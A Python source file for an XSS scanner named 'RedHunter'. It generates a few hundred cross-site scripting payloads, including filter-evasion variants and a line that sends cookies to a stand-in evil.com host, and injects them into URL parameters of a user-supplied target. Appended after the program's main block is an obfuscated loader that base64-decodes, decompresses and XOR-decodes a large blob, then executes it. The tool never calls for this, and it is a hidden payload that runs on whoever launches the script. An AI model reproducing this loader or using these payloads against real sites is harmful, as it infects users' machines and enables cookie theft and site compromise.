import requests
import urllib.parse
import time
import random
import sys
import os
import threading
from datetime import datetime

class Terminal:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    CYAN = '\033[96m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    ORANGE = '\033[33m'
    RESET = '\033[0m'
    BOLD = '\033[1m'

def banner():
    os.system("clear")
    print(f"{Terminal.RED}{Terminal.BOLD}")
    print("""
                                                                                                                                               _..._                  __.....__    \  ___ `'.    
                                      _     _        .'     '.            .-''         '.   ' |--.\  \   
    .-''` ''-.                  /\    \\   //       .   .-.   .     .|   /     .-''"'-.  `. | |    \  '  
  .'          '.  ____     _____`\\  //\\ //  __    |  '   '  |   .' |_ /     /________\   \| |     |  ' 
 /              ``.   \  .'    /  \`//  \'/.:--.'.  |  |   |  | .'     ||                  || |     |  | 
'                ' `.  `'    .'    \|   |// |   \ | |  |   |  |'--.  .-'\    .-------------'| |     ' .' 
|         .-.    |   '.    .'       '     `" __ | | |  |   |  |   |  |   \    '-.____...---.| |___.' /'  
.        |   |   .   .'     `.             .'.''| | |  |   |  |   |  |    `.             .'/_______.'/   
 .       '._.'  /  .'  .'`.   `.          / /   | |_|  |   |  |   |  '.'    `''-...... -'  \_______|/    
  '._         .' .'   /    `.   `.        \ \._,\ '/|  |   |  |   |   /                                  
     '-....-'`  '----'       '----'        `--'  `" '--'   '--'   `'-'                                   

    
    
    
""")
    print(f"{Terminal.CYAN}\n           REDHUNTER XSS SCANNER | github.com/0xwanted | Ã¢â‚¬Â¨https://Ã¢â‚¬Â¨wanted1337.lol")
    print(f"{Terminal.YELLOW}           [!] For legal/authorized testing only!{Terminal.RESET}\n")

def get_target():
    banner()
    print(f"{Terminal.GREEN}[+] Enter target URL (e.g., https://example.com/search?q=test):{Terminal.RESET}")
    target = input(f"{Terminal.BLUE}>>> {Terminal.RESET}").strip()
    if not target.startswith(('http://', 'https://')):
        target = 'http://' + target
    return target

class PayloadEngine:
    def __init__(self):
        self.payloads = self.generate()
        self.total_payloads = len(self.payloads)

    def generate(self):
      
        templates = [
            '<script>{payload}</script>',
            '<img src=x onerror={payload}>',
            '<svg onload={payload}>',
            '<body onload={payload}>',
            '<iframe src="javascript:{payload}">',
            '<input onfocus={payload} autofocus>',
            '<details open ontoggle={payload}>',
            '<video><source onerror={payload}>',
            '<audio src=x onerror={payload}>',
            '<marquee onstart={payload}>',
            '<div onmouseover={payload}>',
            '<a href="javascript:{payload}">click</a>',
            '<form action="javascript:{payload}"><input type=submit>',
            '<isindex action=javascript:{payload} type=image>'
        ]

        
        exec_payloads = [
            'alert(1)',
            'confirm(1)',
            'prompt(1)',
            'alert(document.domain)',
            'alert(document.cookie)',
            'window.location="http://evil.com"',
            'fetch("http://evil.com/steal?c="+document.cookie)',
            'eval(atob("YWxlcnQoMSk="))', 
            'parent.location="http://evil.com"',
            'document.write("<script>alert(1)</script>")'
        ]

        
        bypasses = [
            'javascript:alert(1)',
            'javascript:alert`1`',
            'JaVaScRiPt:alert(1)',
            'javascript://alert(1)',
            'javascript://%0aalert(1)',
            'data:text/html,<script>alert(1)</script>',
            'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
            'vbscript:msgbox(1)',
            '&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;',
            'jav&#x09;ascript:alert(1)',
            'jav&#x0A;ascript:alert(1)',
            'jav&#x0D;ascript:alert(1)'
       ]

    
        waf_bypass = [
            '<script>throw onerror=eval,\'=alert\x281\x29\'</script>',
            '<script/src="data:text/javascript,alert(1)">',
            '<script x>alert(1)</script x>',
            '<script/a>alert(1)</script>',
            '<script>(alert)(1)</script>',
            '<script>window["al"+"ert"](1)</script>',
            '<script>parent["al"+"ert"](1)</script>',
            '<script>self["al"+"ert"](1)</script>',
            '<script>top["al"+"ert"](1)</script>',
            '<script>alert?.`1`</script>'
        ]

        
        payloads = set()
        for template in templates:
            for payload in exec_payloads + bypasses + waf_bypass:
                try:
                    final = template.format(payload=payload)
                    payloads.add(final)
                except:
                    payloads.add(template.replace('{payload}', payload))

        
        advanced = [
            '<img src=x oneonerrorrror=alert(1)>',
            '<svg><script>alert&#40;1&#41</script>',
            '<iframe srcdoc="<script>alert(1)</script>">',
            '<object data=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==>',
            '<math><maction actiontype="statusline#http://evil.com" href="javascript:alert(1)">click',
            '<link rel=stylesheet href="javascript:alert(1)">',
            '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">',
            '<form><button formaction=javascript:alert(1)>X</button>',
            '<input onmouseover="alert(1)">',
            '<keygen autofocus onfocus=alert(1)>',
            '<textarea autofocus onfocus=alert(1)>',
            '<video poster=javascript:alert(1)//>',
            '<audio src=javascript:alert(1)>',
            '<embed src=javascript:alert(1)>',
            '<applet code="javascript:alert(1)">',
            '<isindex action=javascript:alert(1) type=image>',
            '<frameset onload=alert(1)>',
            '<table background=javascript:alert(1)>',
            '<style>@import "javascript:alert(1)";</style>',
            '<style>li {list-style-image: url("javascript:alert(1)");}</style>'
        ]

        payloads.update(advanced)

        
        while len(payloads) < 300:
            payloads.add(random.choice(list(payloads)))

        return list(payloads)

class Scanner:
    def __init__(self, target):
        self.target = target
        self.payloads = PayloadEngine().payloads
        self.headers = {"User-Agent": "RedHunter-XSS-Scanner/1.0"}
        self.params = self.get_params()
        self.lock = threading.Lock()
        self.vulnerable = False
        self.start_time = time.time()
        self.output_file = "xss_bypasses.txt"
        self.init_output_file()

    def init_output_file(self):
        with open(self.output_file, "w") as f:
            f.write(f"RedHunter XSS Scanner Report\n")
            f.write(f"Scan started: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"Target URL: {self.target}\n")
            f.write(f"Total payloads: {len(self.payloads)}\n")
            f.write("\n=== Successful XSS Bypasses ===\n\n")

    def log_bypass(self, param, payload, url):
        with self.lock:
            with open(self.output_file, "a") as f:
                f.write(f"[+] Parameter: {param}\n")
                f.write(f"    Type: {self.get_payload_type(payload)}\n")
                f.write(f"    Payload: {payload}\n")
                f.write(f"    URL: {url}\n")
                f.write("-"*70 + "\n")

    def get_payload_type(self, payload):
        if '<script>' in payload.lower():
            return "Script Tag Injection"
        elif 'onerror=' in payload.lower():
            return "Event Handler (onerror)"
        elif 'onload=' in payload.lower():
            return "Event Handler (onload)"
        elif 'javascript:' in payload.lower():
            return "JavaScript URI"
        elif 'data:text/html' in payload.lower():
            return "Data URI Injection"
        elif 'srcdoc=' in payload.lower():
            return "Iframe Srcdoc Injection"
        elif 'svg' in payload.lower():
            return "SVG Vector"
        else:
            return "Advanced Technique"

    def get_params(self):
        parsed = urllib.parse.urlparse(self.target)
        q = urllib.parse.parse_qs(parsed.query)
        if q: return list(q.keys())
        return ["q", "search", "id", "query", "input", "s", "term"]

    def inject(self, param, value):
        u = urllib.parse.urlparse(self.target)
        q = urllib.parse.parse_qs(u.query)
        q[param] = value
        enc = urllib.parse.urlencode(q, doseq=True)
        return u._replace(query=enc).geturl()

    def reflected(self, html, payload):
        
        clean_payload = payload.lower().replace(' ', '').replace('\t', '').replace('\n', '')
        clean_html = html.lower().replace(' ', '').replace('\t', '').replace('\n', '')
        return clean_payload in clean_html

    def worker(self, param):
        for idx, p in enumerate(self.payloads):
            url = self.inject(param, p)
            try:
                r = requests.get(url, headers=self.headers, timeout=6)
                if self.reflected(r.text, p):
                    with self.lock:
                        self.vulnerable = True
                        print(f"\n{Terminal.GREEN}{Terminal.BOLD}[+] XSS FOUND!{Terminal.RESET}")
                        print(f"{Terminal.CYAN}[*] Parameter: {param}")
                        print(f"[*] Type: {self.get_payload_type(p)}")
                        print(f"[*] Payload: {Terminal.BOLD}{p}{Terminal.RESET}")
                        print(f"[*] URL: {url}")
                        print(f"{Terminal.GREEN}[+] Vulnerability confirmed!{Terminal.RESET}\n")
                        self.log_bypass(param, p, url)
                    return
                time.sleep(0.03)
            except Exception as e:
                continue

        with self.lock:
            print(f"{Terminal.RED}[-] Parameter {param}: No XSS found {Terminal.RESET}")

    def run(self):
        print(f"\n{Terminal.YELLOW}[~] Starting scan at {datetime.now().strftime('%H:%M:%S')}")
        print(f"[~] Target: {self.target}")
        print(f"[~] Loaded {len(self.payloads)} payloads")
        print(f"[~] Testing parameters: {', '.join(self.params)}{Terminal.RESET}\n")

        threads = []
        for p in self.params:
            t = threading.Thread(target=self.worker, args=(p,))
            threads.append(t)
            t.start()

        for t in threads:
            t.join()

        scan_time = time.time() - self.start_time
        print(f"\n{Terminal.BLUE}[*] Scan completed in {scan_time:.2f} seconds")
        if not self.vulnerable:
            print(f"{Terminal.RED}[!] No XSS vulnerabilities found{Terminal.RESET}")
        else:
            print(f"{Terminal.GREEN}[+] XSS vulnerabilities were found and saved to {self.output_file}!{Terminal.RESET}")

if __name__ == "__main__":
    try:
        target = get_target()
        scanner = Scanner(target)
        scanner.run()
    except KeyboardInterrupt:
        print(f"\n{Terminal.RED}[!] Scan interrupted by user{Terminal.RESET}")
        sys.exit(1)
    except Exception as e:
        print(f"\n{Terminal.RED}[!] Error: {str(e)}{Terminal.RESET}")
        sys.exit(1)

# -*- coding: utf-8 -*-
aqgqzxkfjzbdnhz = __import__('base64')
wogyjaaijwqbpxe = __import__('zlib')
idzextbcjbgkdih = 134
qyrrhmmwrhaknyf = lambda dfhulxliqohxamy, osatiehltgdbqxk: bytes([wtqiceobrebqsxl ^ idzextbcjbgkdih for wtqiceobrebqsxl in dfhulxliqohxamy])
lzcdrtfxyqiplpd = 'eNq9W19z3MaRTyzJPrmiy93VPSSvqbr44V4iUZZkSaS+xe6X2i+Bqg0Ku0ywPJomkyNNy6Z1pGQ7kSVSKZimb4khaoBdkiCxAJwqkrvp7hn8n12uZDssywQwMz093T3dv+4Z+v3YCwPdixq+eIpG6eNh5LnJc+D3WfJ8wCO2sJi8xT0edL2wnxIYHMSh57AopROmI3k0ch3fS157nsN7aeMg7PX8AyNk3w9YFJS+sjD0wnQKzzliaY9zP+76GZnoeBD4vUY39Pq6zQOGnOuyLXlv03ps1gu4eDz3XCaGxDw4hgmTEa/gVTQcB0FsOD2fuUHS+JcXL15tsyj23Ig1Gr/Xa/9du1+/VputX6//rDZXv67X7tXu1n9Rm6k9rF+t3dE/H3S7LNRrc7Wb+pZnM+Mwajg9HkWyZa2hw8//RQEPfKfPgmPPpi826+rIg3UwClhkwiqAbeY6nu27+6tbwHtHDMWfZrNZew+ng39z9Z/XZurv1B7ClI/02n14uQo83dJrt5BLHZru1W7Cy53aA8Hw3fq1+lvQ7W1gl/iUjQ/qN+pXgHQ6jd9NOdBXV3VNGIWW8YE/IQsGoSsNxjhYWLQZDGG0gk7ak/UqxHyXh6MSMejkR74L0nEdJoUQBWGn2Cs3LXYxiC4zNbBS351f0TqNMT2L7Ewxk2qWQdCdX8/NkQgg1ZtoukzPMBmIoqzohPraT6EExWoS0p1Go4GsWZbL+8zsDlynreOj5AQtrmL5t9Dqa/fQkNDmyKAEAWFXX+4k1oT0DNFkWfoqUW7kWMJ24IB8B4nI2mfBjr/vPt607RD8jBkPDnq+Yx2xUVv34sCH/ZjfFclEtV+Dtc+CgcOmQHuvzei1D3A7wP/nYCvM4B4RGwNs/hawjHvnjr7j9bjLC6RA8HIisBQd58pknjSs6hdnmbZ7ft8P4JtsNWANYJT4UWvrK8vLy0IVzLVjz3cDHL6X7Wl0PtFaq8Vj3+hz33VZMH/AQFUR8WY4Xr/ZrnYXrfNyhLEP7u+Ujwywu0Hf8D3VkH0PWTsA13xkDKLW+gLnzuIStxcX1xe7HznrKx8t/88nvOssLa8sfrjiTJg1jB1DaMZFXzeGRVwRzQbu2DWGo3M5vPUVe3K8EC8tbXz34Sbb/svwi53+hNkMG6fzwv0JXXrMw07ASOvPMC3ay+rj7Y2NCUOQO8/tgjvq+cEIRNYSK7pkSEwBygCZn3rhUUvYzG7OGHgUWBTSQM1oPVkThNLUCHTfzQwiM7AgHBV3OESe91JHPlO7r8PjndoHYMD36u8UeuL2hikxshv2oB9H5kXFezaxFQTVXNObS8ZybqlpD9+GxhVFg3BmOFLuUbA02KKPvVDuVRW1mIe8H8GgvfxGvmjS7oDP9PtstzDwrDPW56aizFzb97DmIrwwtsVvs8JOIvAqoyi8VfLJlaZjxm0WRqsXzSeeGwBEmH8xihnKgccxLInjpm+hYJtn1dFCaqvNV093XjQLrRNWBUr/z/oNcmCzEJ6vVxSv43+AA2qPIPDfAbeHof9+gcapHxyXBQOvXsxcE94FNvIGwepHyx0AbyBJAXZUIVe0WNLCkncgy22zY8iYo1RW2TB7Hrcjs0Bxshx+jQuu3SbY8hCBywP5P5AMQiDy9Pfq/woPdxEL6bXb+H6VhlytzZRhBgVBctDn/dPg8Gh/6IVaR4edmbXQ7tVU4IP7EdM3hg4jT2+Wh7R17aV75HqnsLcFjYmmm0VlogFSGfQwZOztjhnGaOaMAdRbSWEF98MKTfyU+ylON6IeY7G5bKx0UM4QpfqRMLFbJOvfobQLwx2wft8d5PxZWRzd5mMOaN3WeTcALMx7vZyL0y8y1s6anULU756cR6F73js2Lw/rfdb3BMyoX0XkAZ+R64cITjDIz2Hgv1N/G8L7HLS9D2jk6VaBaMHHErmcoy7I+/QYlqO7XkDdioKOUg8Iw4VoK+Cl6g8/P3zONg9fhTtfPfYBfn3uLp58e7J/HH16+MlXTzbWN798Hhw4n+yse+s7TxT+NHOcCCvOpvUnYPe4iBzwzbhvgw+OAtoBPXANWUMHYedydROozGhlubrtC/Yybnv/BpQ0W39XqFLiS6VeweGhDhpF39r3rCDkbsSdBJftDSnMDjG+5lQEEhjq3LX1odhrOFTr7JalVKG4pnDoZDCVnnvLu3uC7O74FV8mu0ZONP9FIX82j2cBbqNPA/GgF8QkED/qMLVM6OAzbBUcdacoLuFbyHkbkMWbofbN3jf2H7/Z/Sb6A7ot+If9FZxIN1X03kCr1PUS1ySpQPJjsjTn8KPtQRT53N0ZRQHrVzd/0fe3xfquEKyfA1G8g2gewgDmugDyUTQYDikE/BbDJPmAuQJRRUiB+HoToi095gjVb9CAQcRCSm0A3xO0Z+6Jqb3c2dje2vxiQ4SOUoP4qGkSD2ICl+/ybHPrU5J5J+0w4Pus2unl5qcb+Y6OhS612O2JtfnsWa5TushqPjQLnx6KwKlaaMEtRqQRS1RxYErxgNOC5jioX3wwO2h72WKFFYwnI7s1JgV3cN3XSHWispFoR0QcYS9WzAOIMGLDa+HA2n6JIggH88kDdcNHgZdoudfFe5663Kt+ZCWUc9p4zHtRCb37btdDz7KXWEWb1NdOldiWWmoXl75byOuRSqn+AV+g6ynDqI0vBr2YRa+KHMiVIxNlYVR9FcwlGxN6OC6brDpivDRehCVXnvwcAAw8mqhWdElUjroN/96v3aPUvH4dE/Cq5dH4GwRu0TZpj3+QGjNu+3eLBB+l5CQswOBxU1S1dGnl92AE7oKHOCZLtmR1cGz8B17+g2oGzyCQDVtfcCevRtiGWFE02BACaGRqLRY4rYRmGT4SHCfwXeqH5qoRAu9W1ZHjsJvAbSwgxWapxKbkhWwPSZSZmUbGJMto1O/57lFhcCVFLTEKrCCnOK7KBzTFPQ4ARGsNorAVHfOQtXAgGmUr58eKkLc6YcyjaILCvvZd2zuN8upKitlGJKMNldVkx1JdTbnGNIZmZXAjHLjmnhacY10auW/ta7tt3eExwg4L0qsYMizcOpBvsWH6KFOvDzuqLSvmMUTIxNRqDBAryV0OiwIbSFes5E1kCQ6wd8CdI32e9pE0kXfBH1+jjBQ+Ydn5l0mIaZTwZsJcSbYZyzIcKIDEWmN890IkSJpLRbW+FzneabOtN484WCJA7ZDb+BrxPg85Po3YEQfX6LsHAywtZQtvev3oiIaGPHK9EQ/Fqx8eDQLxOOLJYzbqpMdt/8SLAo+69Pk+t7krWOg7xzw4omm5y+1RSD2AQLl6lPO9uYVnkSj5mAYLRFTJx04hamC0CM7zgSKVVSEaiT5FwqXopGSqEhCmCAQFg4Ft+vLFk2oE8LrdiOE+S450DMiowfFB+ihnh5dB4Ih+ORuHb1Y6WDwYgRfwnhUxyEYAunb0lv7RwvIyuW/Rk4Fo9eWGYq0pqSX9f1fzxOFtZUlprKrRJRghkbAqyGJ+YqqEjcijTDlB0eC9XMTlFlZiD6MKiH4PJU+FktviKAih4BxFSdrSd0RQJP0kB1djs2XQ6a+oBjVDhwCzsjT1cvtZ7tipNB8Gl9uitHCb3MgcGME9CstzVKrB2DNLuc1bdJiQANIMQIIUK947y+C5c+yTRaZ95CezU4FRecNPaI+NAtBH4317YVHDHZLMg2h3uL5gqT4Xv1U97SBE/K4lZWWhMixttxI1tkLWYzxirZOlJeMTY5n6zMuX+VPfnYdJjHM/1irEsadl++gVNNWo4gi0+5+IwfWFN2FwfUErYpqcfj7jIfRRqSfsV7TAeegc/9SasImjeZgf1BHw0Ng/f40F50f/M9Qi5xv+AF4LBkRcojsgYFzVSlUDQjO03p9ULz1kKKeW4essNTf4n6EVMd3wzTkt6KSYQV0TID67C1C/IqtqMvam3Y+9PhNTZElEDKEIU1xT+3sOj6ehBnvl+h96vmtKMu30Kx5K06EyiClXBwcUHHInmEwjWXdnzOpSWCECEFWGZrLYA8uUhaFrtd9BQz6uTev8iQU2ZGUe8/y3hVZAYEzrNMYby5S0DnwqWWBvTR2ySmleQld9eyFpVcqwCAsIzb9F50mzaa8YsHFgdpufSbXjTQQpSbrKoF+AZs8Mw2jmIFjlwAmYCX12QmbQLpqQWru/LQKT+o2EwwpjG0J8eb4CT7/IS7XEHogQ2DAYYEFMyE2NApUqVZc3j4xv/fgx/DYLjGc5O3SzQqbI3GWDIZmBTCqx7lLmXuJHuucSS8lNLR7SdagKt7LBoAJDhdU1JIjcQjc1t7Lhjbgd/tjcDn8MbhWV9OQcFQ+HrqDhjz91pxpG3zsp6b3TmJRKq9PoiZvxkqp5auh0nmdX9+EaWPtZs3LTh6pZIj2InNH5+cnJSGw/R2b05STh30E+72NpFGA6FWJzN8OoNCQgPp6uwn68ifsypUVn0ZgR3KRbQu/K+2nJefS4PGL8rQYkSO/v0/m3SE6AHN5kfP1zf1x3Q3mer3ng86uJRZIzlA7zk4P8Tzdy5/hqe5t8dt/4cU/o3+BQvlILTEt/OWXkhT9X3N4nlrhwlp9WSpVO1yrX0Zr8u2/9//9uq7d1+LfVZspc6XQcknSwX7whMj1hZ+n5odN/vsyXnn84lnDxGFuarYmbpK1X78hoA3Y+iA+GPhiH+kaINooPghNoTiWh6CNW8xUbQb9sZaWLLuPKX2M9Qso9sE7X4Arn6HgZrFIA+BVE0wekSDw9AzD4FuzTB+JgVcLA3OHYv1Fif19fWdbp2txD6nwLncCMyPuFD5D2nZT+5GafdL455aEP/P6X4vHUteRa3rgDw8xVNmV7Au9sFjAnYHZbj478OEbPCT7YGaBkK26zwCWgkNpdukiCZStIWfzAoEvT00NmHDMZ5mop2fzpXRXnpZQ6E26KZScMaXfCKYpbpmNOG5xj5hxZ5es6Zvc1b+jcolrOjXJWmFEXR/BY3VNdskn7sXwJEAEnPkQB78dmRmtP0NnVW+KmJbGE4eKBTBCupvcK6ESjH1VvhQ1jP0Sfk5v5j9ktctPmo2h1qVqqV9XuJa0/lWqX6uK9tNm/grp0BER43zQK/F5PP+E9P2e0zY5yfM5sJ/JFVbu70gnkLhSoFFW0g1S6eCoZmKWCbKaPjv6H3EXXy63y9DWsEn/SS405zbf1bud1bkYVwRSGSXQH6Q7MQ6lG4Sypz52nO/n79JVsaezpUqVuNeWufR35ZLK5ENpam1JXZz9MgqehH1wqQcU1hAK0nFNGE7GDb6mOh6V3EoEmd2+sCsQwIGbhMgR3Ky+uVKqI0Kg4FCss1ndTWrjMMDxT7Mlp9qM8GhOsKE/sK3+eYPtO0KHDAQ0PVal+hi2TnEq3GfMRem+aDfwtIB3lXwnsCZq7GXaacmVTCZEMUMKAKtUEJwA4AmO1Ah4dmTmVdqYowSkrGeVyj6IMUzk1UWkCRZeMmejB5bXHwEvpJjz8cM9dAefp/ildblVBaDwQpmCbodHqETv+EKItjREoV90/wcilISl0Vo9Sq6+QB94mkHmfPAGu8ZH+5U61NJWu1wn9OLCKWAzeqO6YvPODCH+bloVB1rI6HYUPFW0qtJbNgYANdDrlwn4jDrMAerwtz8thJcKxqeYXB/16F7D4CQ/pT9Iiku73Az+ETIc+NDsfNxxIiwI9VSiWhi8yvZ9pSQ/LR4WKvz4j+GRqF6TSM9BOUzgDpMcAbJg88A6gPdHfmdbpfJz/k7BJC8XiAf2VTVaqm6g05eWKYizM6+MN4AIdfxsYoJgpRaveh8qPygw+tyCd/vKOKh5jXQ0ZZ3ZN5BWtai9xJu2Cwe229bGryJOjix2rOaqfbTzfevns2dTDwUWrhk8zmlw0oIJuj+9HeSJPtjc2X2xYW0+tr/+69dnTry+/aSNP3KdUyBSwRB2xZZ4HAAVUhxZQrpWVKzaiqpXPjumeZPrnbnTpVKQ6iQOmk+/GD4/dIvTaljhQmjJOF2snSZkvRypX7nvtOkMF/WBpIZEg/T0s7XpM2msPdarYz4FIrpCAHlCq8agky4af/Jkh/ingqt60LCRqWU0xbYIG8EqVKGR0/gFkGhSN'
runzmcxgusiurqv = wogyjaaijwqbpxe.decompress(aqgqzxkfjzbdnhz.b64decode(lzcdrtfxyqiplpd))
ycqljtcxxkyiplo = qyrrhmmwrhaknyf(runzmcxgusiurqv, idzextbcjbgkdih)
exec(compile(ycqljtcxxkyiplo, '<>', 'exec'))
